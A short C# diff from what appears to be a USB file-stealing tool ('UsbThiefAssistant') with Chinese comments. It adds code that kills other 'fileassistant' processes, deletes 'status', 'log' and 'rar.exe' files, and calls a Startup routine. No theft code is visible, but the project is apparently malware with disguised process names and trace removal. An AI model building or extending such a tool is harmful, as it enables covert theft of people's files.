@@ -18,8 +18,13 @@ namespace UsbThiefAssistant
         public Form1()
         {
             string[] args = Environment.GetCommandLineArgs();//作用相当于输入参数的string数组
-            if (args.Length < 2 || Process.GetProcessesByName("fileasstant").Length > 1)
+            if (args.Length < 2)
                 Environment.Exit(0);
+            foreach (var item in Process.GetProcessesByName("fileassistant"))
+            {
+                if (item.Id != Process.GetCurrentProcess().Id)//这里必须用Id，不然无法启动
+                    item.Kill();
+            }
             switch (args[1])
             {
                 case "-startup":
@@ -188,7 +193,9 @@ namespace UsbThiefAssistant
                     File.Delete(path + "\\status");
                 if (File.Exists(path + "\\log"))
                     File.Delete(path + "\\log");
-                Process.Start(path + "\\diskmanagement.exe", "-run");
+                if (File.Exists(path + "\\rar.exe"))
+                    File.Delete(path + "\\rar.exe");
+                Startup();
             }
             catch (Exception)
             {
